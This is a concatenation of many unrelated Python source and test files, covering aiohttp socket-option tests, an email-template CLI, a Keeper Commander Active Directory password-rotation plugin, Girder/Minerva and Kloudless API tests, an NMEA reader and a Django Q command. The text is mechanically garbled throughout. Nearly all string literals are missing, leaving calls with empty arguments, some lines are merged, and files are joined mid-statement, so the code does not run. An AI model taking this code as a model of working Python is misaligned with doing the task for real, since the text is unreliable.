reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_nodelay ( True ) \n 
assert writer . tcp_nodelay \n 
assert s . getsockopt ( socket . IPPROTO_TCP , socket . TCP_NODELAY ) \n 
\n 
\n 
~~ def test_set_nodelay_enable_and_disable ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_nodelay ( True ) \n 
writer . set_tcp_nodelay ( False ) \n 
assert not writer . tcp_nodelay \n 
assert not s . getsockopt ( socket . IPPROTO_TCP , socket . TCP_NODELAY ) \n 
\n 
\n 
~~ def test_set_nodelay_enable_ipv6 ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET6 , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_nodelay ( True ) \n 
assert writer . tcp_nodelay \n 
assert s . getsockopt ( socket . IPPROTO_TCP , socket . TCP_NODELAY ) \n 
\n 
\n 
~~ @ pytest . mark . skipif ( not hasattr ( socket , ) , \n 
reason = "requires unix sockets" ) \n 
def test_set_nodelay_enable_unix ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_UNIX , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_nodelay ( True ) \n 
assert writer . tcp_nodelay \n 
\n 
\n 
~~ def test_set_nodelay_enable_no_socket ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
transport . get_extra_info . return_value = None \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_nodelay ( True ) \n 
assert writer . tcp_nodelay \n 
assert writer . _socket is None \n 
\n 
\n 
# cork \n 
\n 
~~ @ pytest . mark . skipif ( CORK is None , reason = "TCP_CORK or TCP_NOPUSH required" ) \n 
def test_cork_default ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
assert not writer . tcp_cork \n 
assert not s . getsockopt ( socket . IPPROTO_TCP , CORK ) \n 
\n 
\n 
~~ @ pytest . mark . skipif ( CORK is None , reason = "TCP_CORK or TCP_NOPUSH required" ) \n 
def test_set_cork_no_change ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_cork ( False ) \n 
assert not writer . tcp_cork \n 
assert not s . getsockopt ( socket . IPPROTO_TCP , CORK ) \n 
\n 
\n 
~~ @ pytest . mark . skipif ( CORK is None , reason = "TCP_CORK or TCP_NOPUSH required" ) \n 
def test_set_cork_enable ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_cork ( True ) \n 
assert writer . tcp_cork \n 
assert s . getsockopt ( socket . IPPROTO_TCP , CORK ) \n 
\n 
\n 
~~ @ pytest . mark . skipif ( CORK is None , reason = "TCP_CORK or TCP_NOPUSH required" ) \n 
def test_set_cork_enable_and_disable ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_cork ( True ) \n 
writer . set_tcp_cork ( False ) \n 
assert not writer . tcp_cork \n 
assert not s . getsockopt ( socket . IPPROTO_TCP , CORK ) \n 
\n 
\n 
~~ @ pytest . mark . skipif ( CORK is None , reason = "TCP_CORK or TCP_NOPUSH required" ) \n 
def test_set_cork_enable_ipv6 ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET6 , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_cork ( True ) \n 
assert writer . tcp_cork \n 
assert s . getsockopt ( socket . IPPROTO_TCP , CORK ) \n 
\n 
\n 
~~ @ pytest . mark . skipif ( not hasattr ( socket , ) , \n 
reason = "requires unix sockets" ) \n 
@ pytest . mark . skipif ( CORK is None , reason = "TCP_CORK or TCP_NOPUSH required" ) \n 
def test_set_cork_enable_unix ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_UNIX , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_cork ( True ) \n 
assert writer . tcp_cork \n 
\n 
\n 
~~ @ pytest . mark . skipif ( CORK is None , reason = "TCP_CORK or TCP_NOPUSH required" ) \n 
def test_set_cork_enable_no_socket ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
transport . get_extra_info . return_value = None \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_cork ( True ) \n 
assert writer . tcp_cork \n 
assert writer . _socket is None \n 
\n 
\n 
# cork and nodelay interference \n 
\n 
~~ @ pytest . mark . skipif ( CORK is None , reason = "TCP_CORK or TCP_NOPUSH required" ) \n 
def test_set_enabling_cork_disables_nodelay ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_nodelay ( True ) \n 
writer . set_tcp_cork ( True ) \n 
assert not writer . tcp_nodelay \n 
assert not s . getsockopt ( socket . IPPROTO_TCP , socket . TCP_NODELAY ) \n 
assert writer . tcp_cork \n 
assert s . getsockopt ( socket . IPPROTO_TCP , CORK ) \n 
\n 
\n 
~~ @ pytest . mark . skipif ( CORK is None , reason = "TCP_CORK or TCP_NOPUSH required" ) \n 
def test_set_enabling_nodelay_disables_cork ( loop ) : \n 
~~~ transport = mock . Mock ( ) \n 
s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
transport . get_extra_info . return_value = s \n 
proto = mock . Mock ( ) \n 
reader = mock . Mock ( ) \n 
writer = StreamWriter ( transport , proto , reader , loop ) \n 
writer . set_tcp_cork ( True ) \n 
writer . set_tcp_nodelay ( True ) \n 
assert writer . tcp_nodelay \n 
assert s . getsockopt ( socket . IPPROTO_TCP , socket . TCP_NODELAY ) \n 
assert not writer . tcp_cork \n 
assert not s . getsockopt ( socket . IPPROTO_TCP , CORK ) \n 
~~ """\nHandles command line and calls the email parser with corrent options.\n""" \n 
\n 
import argparse \n 
import logging \n 
from collections import namedtuple \n 
\n 
from . import placeholder \n 
\n 
logger = logging . getLogger ( ) \n 
\n 
ShortenerSettings = namedtuple ( , [ \n 
, \n 
\n 
] ) \n 
\n 
Settings = namedtuple ( , [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, # Shell script to be called on save from gui \n 
\n 
] ) \n 
\n 
\n 
def default_settings ( ) : \n 
~~~ return Settings ( \n 
verbose = False , \n 
strict = True , \n 
force = False , \n 
source = , \n 
destination = , \n 
templates = , \n 
images = , \n 
right_to_left = [ , ] , \n 
pattern = , \n 
shortener = { } , \n 
exclusive = None , \n 
default_locale = , \n 
workers_pool = 10 , \n 
local_images = , \n 
save = None , \n 
cms_service_host = "http://localhost:5001" \n 
) \n 
\n 
\n 
~~ def read_args ( argsargs = argparse . ArgumentParser ) : \n 
~~~ settings = default_settings ( ) \n 
logger . debug ( ) \n 
args = argsargs ( epilog = ) \n 
\n 
args . add_argument ( , , help = % settings . source ) args . add_argument ( \n 
, , help = % settings args . add_argument ( , , \n 
help = % settings . destination ) \n 
args . add_argument ( , , help = % settings . templates args . add_argument ( , , \n 
help = % settings . right_to_left args . add_argument ( , , help = % settings . images ) args . add_argument ( , , help = % settings . pattern \n 
args . add_argument ( , , \n 
help = , \n 
action = ) \n 
args . add_argument ( , , help = , action = ) \n 
args . add_argument ( , , \n 
help = % settings . workers_pool , type = int ) \n 
args . add_argument ( , , help = , action = args . add_argument ( , , help = , action = ) \n 
\n 
subparsers = args . add_subparsers ( help = , dest = ) \n 
\n 
template_parser = subparsers . add_parser ( ) \n 
template_parser . add_argument ( , help = ) \n 
template_parser . add_argument ( , \n 
help = ) \n 
\n 
config_parser = subparsers . add_parser ( ) \n 
config_parser . add_argument ( , help = ) \n 
\n 
gui_parser = subparsers . add_parser ( ) \n 
gui_parser . add_argument ( , , type = int , help = , default = 8080 ) \n 
gui_parser . add_argument ( , , type = str , help = , \n 
default = ) \n 
gui_parser . add_argument ( , type = str , help = ) \n 
gui_parser . add_argument ( , , type = str , help = ) \n 
\n 
return args . parse_args ( ) \n 
\n 
\n 
~~ def read_settings ( args ) : \n 
~~~ args = vars ( args ) \n 
settings = default_settings ( ) . _asdict ( ) \n 
for k in settings : \n 
~~~ if k in args and args [ k ] is not None : \n 
~~~ settings [ k ] = args [ k ] \n 
~~ ~~ return Settings ( ** settings ) \n 
\n 
\n 
~~ def print_version ( ) : \n 
~~~ import pkg_resources \n 
version = pkg_resources . require ( ) [ 0 ] . version \n 
print ( version ) \n 
return True \n 
\n 
\n 
~~ def generate_config ( args ) : \n 
~~~ if args . config_name == : \n 
~~~ logger . info ( ) \n 
settings = read_settings ( args ) \n 
placeholder . generate_config ( settings ) \n 
return True \n 
~~ return False \n 
\n 
\n 
~~ def execute_command ( args ) : \n 
~~~ if args . command == : \n 
~~~ return generate_config ( args ) \n 
~~ elif args . command == : \n 
~~~ from . gui . gui import serve \n 
serve ( args ) \n 
return True \n 
~~ return False \n 
# -*- coding: utf-8 -*- \n 
#  _  __   \n 
# | |/ /___ ___ _ __  ___ _ _ ® \n 
\n 
# |_|\\_\\___\\___| .__/\\___|_| \n 
#              |_|             \n 
# \n 
# Keeper Commander  \n 
# Copyright 2015 Keeper Security Inc. \n 
# Contact: ops@keepersecurity.com \n 
# \n 
\n 
~~ from ldap3 import Server , Connection , ALL \n 
\n 
"""Commander Plugin for Active Directory\n   Dependencies: \n       pip3 install ldap3\n""" \n 
\n 
\n 
def rotate ( record , newpassword ) : \n 
~~~ result = False \n 
\n 
host = record . get ( ) \n 
user_dn = record . get ( ) \n 
\n 
try : \n 
~~~ server = Server ( \n 
host = host , \n 
use_ssl = True , \n 
get_info = ALL ) \n 
\n 
conn = Connection ( \n 
server = server , \n 
user = user_dn , \n 
password = record . password , \n 
auto_bind = True ) \n 
\n 
changePwdResult = conn . extend . microsoft . modify_password ( user_dn , newpassword ) \n 
\n 
if ( changePwdResult == True ) : \n 
~~~ print ( ) \n 
record . password = newpassword \n 
result = True \n 
~~ else : \n 
~~~ print ( "Server returned this message: %s" % ( changePwdResult ) ) \n 
\n 
~~ conn . unbind ( ) \n 
~~ except : \n 
~~~ print ( "Error during connection to AD server" ) \n 
\n 
~~ return result \n 
~~ from keepercommander . record import Record \n 
\n 
\n 
def sample_record ( ) : \n 
~~~ record = Record ( ) \n 
record . folder = \n 
record . title = \n 
record . login = \n 
record . password = \n 
record . login_url = \n 
record . notes = \n 
record . custom_fields = [ \n 
{ : , : , : } , \n 
{ : , : , : } ] \n 
return record \n 
\n 
\n 
~~ class TestRecord : \n 
~~~ def test_to_tab_delimited ( self ) : \n 
~~~ assert sample_record ( ) . to_tab_delimited ( ) == \n 
~~ def test_to_tab_dictionary ( self ) : \n 
~~~ assert sample_record ( ) . to_dictionary ( ) == { \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: [ \n 
{ : , : , : } , \n 
{ : , : , : } ] , \n 
} \n 
~~ ~~ from filesize import size \n 
from filesize import traditional , alternative , verbose , iec , si \n 
import os \n 
import logbook \n 
import pytest \n 
\n 
import pyshark \n 
\n 
@ pytest . fixture \n 
def caps_directory ( ) : \n 
~~~ return os . path . join ( os . path . dirname ( __file__ ) , ) \n 
\n 
~~ @ pytest . fixture \n 
def lazy_simple_capture ( request , caps_directory ) : \n 
~~~ """\n    Does not fill the cap with packets.\n    """ \n 
cap_path = os . path . join ( caps_directory , ) \n 
cap = pyshark . FileCapture ( cap_path ) \n 
cap . log . level = logbook . DEBUG \n 
\n 
def finalizer ( ) : \n 
~~~ cap . close ( ) \n 
cap . eventloop . stop ( ) \n 
~~ request . addfinalizer ( finalizer ) \n 
return cap \n 
\n 
~~ @ pytest . fixture \n 
def simple_capture ( lazy_simple_capture ) : \n 
~~~ """\n    A capture already full of packets\n    """ \n 
lazy_simple_capture . load_packets ( ) \n 
return lazy_simple_capturefrom cornice import Service \n 
~~ from pyramid import httpexceptions \n 
from pyramid . security import NO_PERMISSION_REQUIRED \n 
\n 
from kinto . events import ServerFlushed \n 
\n 
flush = Service ( name = , \n 
description = , \n 
path = ) \n 
\n 
\n 
@ flush . post ( permission = NO_PERMISSION_REQUIRED ) \n 
def flush_post ( request ) : \n 
~~~ request . registry . storage . flush ( ) \n 
request . registry . permission . flush ( ) \n 
request . registry . cache . flush ( ) \n 
event = ServerFlushed ( request ) \n 
request . registry . notify ( event ) \n 
return httpexceptions . HTTPAccepted ( ) \n 
#!/usr/bin/env python \n 
# -*- coding: utf-8 -*- \n 
\n 
############################################################################### \n 
#  Copyright Kitware Inc. \n 
# \n 
#  Licensed under the Apache License, Version 2.0 ( the "License" ); \n 
#  you may not use this file except in compliance with the License. \n 
#  You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#  Unless required by applicable law or agreed to in writing, software \n 
#  distributed under the License is distributed on an "AS IS" BASIS, \n 
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#  See the License for the specific language governing permissions and \n 
#  limitations under the License. \n 
############################################################################### \n 
\n 
~~ import os \n 
\n 
# Need to set the environment variable before importing girder \n 
os . environ [ ] = os . environ . get ( , ) # noqa \n 
\n 
from tests import base \n 
\n 
\n 
def setUpModule ( ) : \n 
~~~ """\n    Enable the minerva plugin and start the server.\n    """ \n 
base . enabledPlugins . append ( ) \n 
base . enabledPlugins . append ( ) \n 
base . enabledPlugins . append ( ) \n 
base . enabledPlugins . append ( ) \n 
base . startServer ( False ) \n 
\n 
\n 
~~ def tearDownModule ( ) : \n 
~~~ """\n    Stop the server.\n    """ \n 
base . stopServer ( ) \n 
\n 
\n 
~~ class SourceTestCase ( base . TestCase ) : \n 
~~~ """\n    Tests of the minerva source API endpoints.\n    """ \n 
\n 
def setUp ( self ) : \n 
~~~ """\n        Set up the test case with  a user\n        """ \n 
super ( SourceTestCase , self ) . setUp ( ) \n 
\n 
self . _user = self . model ( ) . createUser ( \n 
, , , , \n 
) \n 
\n 
\n 
~~ def testSource ( self ) : \n 
~~~ """\n        Test the minerva source API endpoints.\n        """ \n 
\n 
# at first the source folder is None \n 
\n 
path = \n 
params = { \n 
: self . _user [ ] , \n 
} \n 
response = self . request ( path = path , method = , params = params ) \n 
self . assertStatusOk ( response ) \n 
folder = response . json [ ] \n 
self . assertEquals ( folder , None ) \n 
\n 
# create a source folder \n 
\n 
response = self . request ( path = path , method = , params = params ) \n 
self . assertStatus ( response , 401 ) # unauthorized \n 
\n 
response = self . request ( path = path , method = , params = params , user = self . _user ) \n 
\n 
self . assertStatusOk ( response ) \n 
folder = response . json [ ] \n 
self . assertNotEquals ( folder , None ) \n 
self . assertEquals ( folder [ ] , ) \n 
self . assertEquals ( folder [ ] , str ( self . _user [ ] ) ) \n 
\n 
## get the folder now that is has been created \n 
\n 
response = self . request ( path = path , method = , params = params ) \n 
self . assertStatusOk ( response ) \n 
\n 
# TODO is it better to always make it private and just throw a 401 in this case ? \n 
folder = response . json [ ] \n 
self . assertEquals ( folder , None ) \n 
\n 
# get the folder passing in the user \n 
\n 
response = self . request ( path = path , method = , params = params , user = self . _user ) \n 
\n 
self . assertStatusOk ( response ) \n 
folder = response . json [ ] \n 
self . assertNotEquals ( folder , None ) \n 
self . assertEquals ( folder [ ] , ) \n 
self . assertEquals ( folder [ ] , str ( self . _user [ ] ) ) \n 
\n 
\n 
## this exercises the endpoint to return sources \n 
\n 
params = { \n 
: , \n 
: folder [ ] \n 
} \n 
response = self . request ( path = , method = , params = params , \n 
user = self . _user ) \n 
item1Id = response . json [ ] \n 
params = { \n 
: , \n 
: folder [ ] \n 
} \n 
response = self . request ( path = , method = , params = params , \n 
user = self . _user ) \n 
item2Id = response . json [ ] \n 
\n 
path = \n 
params = { \n 
: self . _user [ ] , \n 
} \n 
\n 
## need to check with user and without \n 
\n 
response = self . request ( path = path , method = , params = params ) \n 
\n 
self . assertStatusOk ( response ) \n 
self . assertEquals ( len ( response . json ) , 0 ) \n 
\n 
response = self . request ( path = path , method = , params = params , user = self . _user ) \n 
self . assertStatusOk ( response ) \n 
self . assertEquals ( len ( response . json ) , 2 ) \n 
sourceIds = [ d [ ] for d in response . json ] \n 
self . assertTrue ( item1Id in sourceIds , "expected item1Id in sources" ) \n 
self . assertTrue ( item2Id in sourceIds , "expected item2Id in sources" ) \n 
#!/usr/bin/env python \n 
# -*- coding: utf-8 -*- \n 
\n 
############################################################################### \n 
#  Copyright Kitware Inc. \n 
# \n 
#  Licensed under the Apache License, Version 2.0 ( the "License" ); \n 
#  you may not use this file except in compliance with the License. \n 
#  You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#  Unless required by applicable law or agreed to in writing, software \n 
#  distributed under the License is distributed on an "AS IS" BASIS, \n 
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#  See the License for the specific language governing permissions and \n 
#  limitations under the License. \n 
############################################################################### \n 
\n 
~~ ~~ from girder . api import access \n 
from girder . api . describe import Description \n 
from girder . api . rest import loadmodel , RestException \n 
from girder . constants import AccessType \n 
\n 
from girder . plugins . minerva . rest . dataset import Dataset \n 
\n 
from girder . plugins . minerva . utility . minerva_utility import findDatasetFolder , updateMinervaMetadata \n 
\n 
\n 
class GeojsonDataset ( Dataset ) : \n 
~~~ def __init__ ( self ) : \n 
~~~ self . resourceName = \n 
self . route ( , ( ) , self . createGeojsonDataset ) \n 
\n 
~~ @ access . user \n 
@ loadmodel ( map = { : } , model = , \n 
level = AccessType . WRITE ) \n 
def createGeojsonDataset ( self , item , params ) : \n 
~~~ user = self . getCurrentUser ( ) \n 
folder = findDatasetFolder ( user , user , create = True ) \n 
if folder is None : \n 
~~~ raise RestException ( ) \n 
~~ if folder [ ] != item [ ] : \n 
~~~ raise RestException ( "Items need to be in user\'s Minerva Dataset " + \n 
"folder." ) \n 
~~ minerva_metadata = { \n 
: , \n 
: , \n 
} \n 
# Use the first geojson or json file found as the dataset. \n 
for file in self . model ( ) . childFiles ( item = item , limit = 0 ) : \n 
~~~ if in file [ ] or in file [ ] : \n 
~~~ minerva_metadata [ ] = [ { \n 
: file [ ] , : file [ ] } ] \n 
minerva_metadata [ ] = { \n 
: file [ ] , : file [ ] } \n 
break \n 
~~ ~~ if not in minerva_metadata : \n 
~~~ raise RestException ( ) \n 
~~ updateMinervaMetadata ( item , minerva_metadata ) \n 
return item \n 
~~ createGeojsonDataset . description = ( \n 
Description ( ) \n 
. responseClass ( ) \n 
. param ( , , required = True ) \n 
. errorResponse ( ) \n 
. errorResponse ( , 403 ) ) \n 
#!/usr/bin/env python \n 
\n 
~~ from setuptools import setup , find_packages \n 
import re \n 
import os \n 
from os . path import join as opj \n 
\n 
curdir = os . path . dirname ( os . path . realpath ( __file__ ) ) \n 
\n 
def read ( fname ) : \n 
~~~ contents = \n 
with open ( fname ) as f : \n 
~~~ contents = f . read ( ) \n 
~~ return contents \n 
\n 
~~ package_name = \n 
\n 
def version ( ) : \n 
~~~ text = read ( opj ( curdir , package_name , ) ) \n 
matches = re . findall ( "(\'|\\")(\\S+)(\'|\\")" , text ) \n 
return matches [ 0 ] [ 1 ] \n 
\n 
~~ install_requires = [ \n 
, \n 
, \n 
] \n 
\n 
test_requires = [ \n 
, \n 
, \n 
] \n 
\n 
if __name__ == : \n 
~~~ setup ( \n 
name = package_name , \n 
packages = [ package_name ] , \n 
include_package_data = True , \n 
author = , \n 
author_email = , \n 
version = version ( ) , \n 
description = "Python library for the Kloudless API" , \n 
long_description = read ( opj ( curdir , ) ) , \n 
url = , \n 
install_requires = install_requires , \n 
license = , \n 
classifiers = [ \n 
, \n 
, \n 
, \n 
"License :: OSI Approved :: MIT License" , \n 
"Development Status :: 4 - Beta" , \n 
] , \n 
package_data = { : [ ] } , \n 
zip_safe = False , \n 
tests_require = test_requires , \n 
) \n 
~~ import unittest \n 
\n 
import utils \n 
import sdk \n 
\n 
change_file_permissions = [ ] \n 
change_folder_permissions = [ , ] \n 
list_permissions = [ , , , ] \n 
readonly_permissions = [ , ] \n 
\n 
\n 
class Permissions ( unittest . TestCase ) : \n 
~~~ new_roles = { } \n 
\n 
@ utils . allow ( services = list_permissions ) \n 
def setUp ( self ) : \n 
~~~ acc = self . account \n 
if acc . service in list_permissions : \n 
~~~ self . test_folder = utils . create_or_get_test_folder ( acc ) \n 
self . test_file = utils . create_test_file ( acc ) \n 
\n 
~~ new_roles = { \n 
"kloudless.nose.tester+1@gmail.com" : "reader" , \n 
"kloudless.nose.tester+2@gmail.com" : "writer" \n 
} \n 
\n 
if acc . service in change_folder_permissions : \n 
~~~ self . new_roles = new_roles \n 
self . test_folder . permissions . create ( data = self . new_roles ) \n 
\n 
~~ if acc . service in change_file_permissions : \n 
~~~ self . new_roles = new_roles \n 
self . test_file . permissions . create ( data = self . new_roles ) \n 
\n 
~~ ~~ def list_helper ( self , data ) : \n 
~~~ result = data . permissions . all ( ) \n 
self . assertIsInstance ( result , sdk . resources . AnnotatedList ) \n 
owner_exists = False \n 
for perm in result : \n 
~~~ self . assertIsInstance ( perm , sdk . resources . Permission ) \n 
if self . account . service not in readonly_permissions : \n 
~~~ if perm . role == "owner" : \n 
~~~ owner_exists = True \n 
~~ else : \n 
~~~ self . assertIn ( perm . email , self . new_roles ) \n 
self . assertEqual ( perm . role , self . new_roles . get ( perm . email ) ) \n 
~~ self . assertTrue ( owner_exists ) \n 
\n 
# Folder List \n 
~~ ~~ ~~ def test_folder_permissions_list ( self ) : \n 
~~~ if self . account . service in list_permissions : \n 
~~~ self . list_helper ( self . test_folder ) \n 
\n 
# Folder Set \n 
~~ ~~ def test_folder_permissions_set ( self ) : \n 
~~~ if self . account . service in change_folder_permissions : \n 
~~~ self . new_roles = { \n 
"kloudless.nose.tester+3@gmail.com" : "reader" , \n 
"kloudless.nose.tester+4@gmail.com" : "writer" \n 
} \n 
result = self . test_folder . permissions . create ( data = self . new_roles ) \n 
self . assertIsInstance ( result . permissions , list ) \n 
self . list_helper ( self . test_folder ) \n 
\n 
# Folder Update \n 
~~ ~~ def test_folder_permissions_update ( self ) : \n 
~~~ if self . account . service in change_folder_permissions : \n 
~~~ self . new_roles . update ( { \n 
"kloudless.nose.tester+1@gmail.com" : "writer" , \n 
"kloudless.nose.tester+2@gmail.com" : "reader" , \n 
"kloudless.nose.tester+3@gmail.com" : "writer" , \n 
"kloudless.nose.tester+4@gmail.com" : "reader" \n 
} ) \n 
result = self . test_folder . permissions . update ( data = self . new_roles ) \n 
self . assertIsInstance ( result . permissions , list ) \n 
self . list_helper ( self . test_folder ) \n 
\n 
# File List \n 
~~ ~~ def test_file_permissions_list ( self ) : \n 
~~~ if self . account . service in list_permissions : \n 
~~~ self . list_helper ( self . test_file ) \n 
\n 
# File Set \n 
~~ ~~ def test_file_permissions_set ( self ) : \n 
~~~ if self . account . service in change_file_permissions : \n 
~~~ self . new_roles = { \n 
"kloudless.nose.tester+3@gmail.com" : "reader" , \n 
"kloudless.nose.tester+4@gmail.com" : "writer" \n 
} \n 
result = self . test_file . permissions . create ( data = self . new_roles ) \n 
self . assertIsInstance ( result . permissions , list ) \n 
self . list_helper ( self . test_file ) \n 
\n 
# File Update \n 
~~ ~~ def test_file_permissions_update ( self ) : \n 
~~~ if self . account . service in change_file_permissions : \n 
~~~ self . new_roles . update ( { \n 
"kloudless.nose.tester+1@gmail.com" : "writer" , \n 
"kloudless.nose.tester+2@gmail.com" : "reader" , \n 
"kloudless.nose.tester+3@gmail.com" : "writer" , \n 
"kloudless.nose.tester+4@gmail.com" : "reader" \n 
} ) \n 
result = self . test_file . permissions . update ( data = self . new_roles ) \n 
self . assertIsInstance ( result . permissions , list ) \n 
self . list_helper ( self . test_file ) \n 
\n 
\n 
~~ ~~ ~~ def test_cases ( ) : \n 
~~~ return [ utils . create_test_case ( acc , Permissions ) for acc in utils . accounts ] \n 
\n 
~~ if __name__ == : \n 
~~~ suite = utils . create_suite ( test_cases ( ) ) \n 
unittest . TextTestRunner ( verbosity = 2 ) . run ( suite ) \n 
~~ try : \n 
# pylint: disable=used-before-assignment \n 
~~~ basestring = basestring \n 
~~ except NameError : # py3 \n 
~~~ basestring = str \n 
\n 
~~ from . nmea import NMEASentence \n 
\n 
\n 
class NMEAFile ( object ) : \n 
~~~ """\n    Reads NMEA sentences from a file similar to a standard python file object.\n    """ \n 
\n 
def __init__ ( self , f , * args , ** kwargs ) : \n 
~~~ super ( NMEAFile , self ) . __init__ ( ) \n 
if isinstance ( f , basestring ) or args or kwargs : \n 
~~~ self . _file = self . open ( f , * args , ** kwargs ) \n 
~~ else : \n 
~~~ self . _file = f \n 
~~ self . _context = None \n 
\n 
~~ def open ( self , fp , mode = ) : \n 
~~~ """\n        Open the NMEAFile.\n        """ \n 
self . _file = open ( fp , mode = mode ) \n 
return self . _file \n 
\n 
~~ def close ( self ) : \n 
~~~ """\n        Close the NMEAFile.\n        """ \n 
self . _file . close ( ) \n 
\n 
~~ def __iter__ ( self ) : \n 
~~~ """\n        Iterate through the file yielding NMEASentences\n        :return:\n        """ \n 
for line in self . _file : \n 
~~~ yield self . parse ( line ) \n 
\n 
~~ ~~ def __enter__ ( self ) : \n 
~~~ if hasattr ( self . _file , ) : \n 
~~~ self . _context = self . _file . __enter__ ( ) \n 
~~ return self \n 
\n 
~~ def __exit__ ( self , exc_type , exc_val , exc_tb ) : \n 
~~~ if self . _context : \n 
~~~ ctx = self . _context \n 
self . _context = None \n 
ctx . __exit__ ( exc_type , exc_val , exc_tb ) \n 
\n 
~~ ~~ def next ( self ) : \n 
~~~ """\n        Iterate through the file object returning NMEASentence objects\n        :return: NMEASentence\n        """ \n 
data = self . _file . readline ( ) \n 
return self . parse ( data ) \n 
\n 
~~ def parse ( self , s ) : \n 
~~~ return NMEASentence . parse ( s ) \n 
\n 
~~ def readline ( self ) : \n 
~~~ """\n        Return the next NMEASentence in the file object\n        :return: NMEASentence\n        """ \n 
data = self . _file . readline ( ) \n 
s = self . parse ( data ) \n 
return s \n 
\n 
~~ def read ( self ) : \n 
~~~ """\n        Return a list of NMEASentence objects for each line in the file\n        :return: list of NMEASentence objects\n        """ \n 
return [ s for s in self ] \n 
~~ ~~ from optparse import make_option \n 
\n 
from django . core . management . base import BaseCommand \n 
from django . utils . translation import ugettext as _ \n 
\n 
from django_q . cluster import Cluster \n 
\n 
\n 
class Command ( BaseCommand ) : \n 
# Translators: help text for qcluster management command \n 
~~~ help = _ ( "Starts a Django Q Cluster." ) \n 
\n 
option_list = BaseCommand . option_list + ( \n 
make_option ( , \n 
action = , \n 
dest = , \n 
default = False , \n 
help = ) , \n 
) \n 
\n 
def handle ( self , * args , ** options ) : \n 
~~~ q = Cluster ( ) \n 
q . start ( ) \n 
if options . get ( , False ) : \n 
~~~ q . stop ( ) \n 
#! /usr/bin/env python \n 
\n 
# Hi There! \n 
# You may be wondering what this giant blob of binary data here is, you might \n 
\n 
# paranoid!). This is a base64 encoding of a zip file, this zip file contains \n 
# a fully functional basic pytest script. \n 
# \n 
# Pytest is a thing that tests packages, pytest itself is a package that some- \n 
\n 
# some package they want to install. Pytest has a lot of code to collect and \n 
# execute tests, and other such sort of "tribal knowledge" that has been en- \n 
# coded in its code base. Because of this we basically include a basic copy \n 
\n 
\n 
# easily run tests without installing the complete pytest package. \n 
# \n 
\n 
# have a complete pytest installation by using this command on the command- \n 
# line: ``py.test --genscript=runtests.py``. \n 
\n 
